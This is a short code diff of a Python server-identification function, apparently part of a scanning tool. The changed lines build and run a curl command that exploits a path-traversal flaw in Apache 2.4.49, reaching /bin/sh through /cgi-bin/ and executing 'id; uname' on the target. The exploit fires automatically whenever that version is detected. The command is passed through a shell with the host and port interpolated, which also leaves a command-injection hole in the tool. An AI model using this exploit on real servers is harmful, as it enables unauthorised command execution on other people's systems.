@@ -127,7 +127,7 @@ def http_identify_server(host, port, proto='http'):
         extensions.append('php')
 
         if '2.4.49' in server_header:
-            cmd = f"curl http://{response.request.headers['Host']}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'"
+            cmd = f"curl {proto}://{host}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'"
             try:
                 output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
 
